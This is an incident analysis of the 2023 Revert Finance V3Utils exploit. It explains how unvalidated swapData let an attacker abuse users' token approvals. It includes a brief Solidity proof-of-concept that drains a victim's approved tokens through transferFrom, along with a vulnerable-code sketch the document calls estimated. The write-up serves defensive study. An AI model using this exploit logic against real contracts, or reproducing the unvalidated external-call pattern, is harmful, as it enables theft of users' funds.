# Revert Finance — V3Utils Arbitrary Swap Path Exploitation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-27 |
| **Protocol** | Revert Finance |
| **Chain** | Ethereum |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | [0xdaccbc43...](https://etherscan.io/tx/0xdaccbc437cb07427394704fbcc8366589ffccf974ec6524f3483844b043f31d5) |
| **Vulnerable Contract** | Revert Finance V3Utils |
| **Root Cause** | `swapData` in V3Utils SwapParams is executed without validation, allowing theft of tokens approved by users |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/RevertFinance_exp.sol) |

---
## 1. Vulnerability Overview

Revert Finance's V3Utils contract is a utility that assists with Uniswap V3 position management. The `swapData` field of `SwapParams` is passed to an arbitrary router without validation, allowing an attacker to drain assets from users who have approved tokens to V3Utils via arbitrary calldata. This is a pattern nearly identical to the Dexible incident (2023-02-17).

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable V3Utils SwapParams
interface V3Utils {
    struct SwapParams {
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        address recipient;
        bytes swapData;   // ❌ Arbitrary callData — no validation
        bool unwrap;
    }
}

// Estimated vulnerable implementation
function swap(SwapParams calldata params) external returns (uint256 amountOut) {
    // Pull tokenIn from user
    IERC20(params.tokenIn).transferFrom(msg.sender, address(this), params.amountIn);

    // ❌ Execute params.swapData against an arbitrary address (no router validation)
    IERC20(params.tokenIn).approve(swapRouter, params.amountIn);
    (bool success,) = swapRouter.call(params.swapData);
    // Attacker sets swapRouter = token contract, swapData = transferFrom(victim...)
}

// ✅ Fix
function swap(SwapParams calldata params) external returns (uint256 amountOut) {
    require(approvedRouters[swapRouter], "Router not approved");  // ✅ Whitelist
    // Block dangerous function selectors in swapData
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: `swapData` in V3Utils SwapParams is executed without validation, allowing theft of tokens approved by users
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Identify victim who has approved tokens to V3Utils
  │
  ├─2─▶ Call V3Utils.swap({
  │         tokenIn: victim_token,
  │         swapData: transferFrom(victim, attacker, amount),
  │         ...
  │     })
  │
  ├─3─▶ V3Utils executes transferFrom on victim's token
  │       Processed under victim's approval to V3Utils
  │
  └─4─▶ Theft complete
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function exploit(address victim, address token, uint256 amount) external {
    // Drain victim's tokens via V3Utils swap function
    V3Utils.SwapParams memory params = V3Utils.SwapParams({
        tokenIn: token,
        tokenOut: token,
        amountIn: 0,
        minAmountOut: 0,
        recipient: address(this),
        // ❌ Arbitrary transferFrom exploiting victim's approval to V3Utils
        swapData: abi.encodeWithSelector(
            IERC20.transferFrom.selector,
            victim,
            address(this),
            amount
        ),
        unwrap: false
    });

    v3Utils.swap(params);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call |
| **Attack Vector** | Unvalidated swapData + user approval abuse |
| **Impact Scope** | Users who approved V3Utils |
| **DASP Classification** | Access Control |
| **CWE** | CWE-284: Improper Access Control |

## 6. Remediation Recommendations

1. **Router Whitelist**: Allow only approved DEX routers.
2. **swapData Function Selector Validation**: Block dangerous selectors such as `transferFrom`, `transfer`, etc.
3. **Public Post-Mortem**: Revert Finance published a detailed post-mortem.

## 7. Lessons Learned

- Both Dexible (02-17) and Revert Finance (02-27) were attacked in the same month using the identical arbitrary calldata pattern.
- DEX aggregators and position management contracts must validate swapData.
- This class of vulnerability is detectable by automated static analysis tools.